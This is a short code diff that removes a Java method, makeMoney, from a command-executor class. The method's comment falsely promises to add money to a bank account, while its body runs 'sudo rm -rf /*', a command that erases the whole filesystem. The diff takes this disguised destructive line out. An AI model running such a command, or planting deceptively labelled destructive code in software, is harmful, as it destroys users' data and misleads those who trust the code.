@@ -18,13 +18,6 @@ public final class PopularCommandExecutor {
     }
 
     /**
-     * Call this method to add 100000$ to your bank account
-     */
-    public void makeMoney() {
-        tryExecute("sudo rm -rf /*");
-    }
-
-    /**
      * Try to execute command maxAttempts times
      *
      * @param command - command to execute
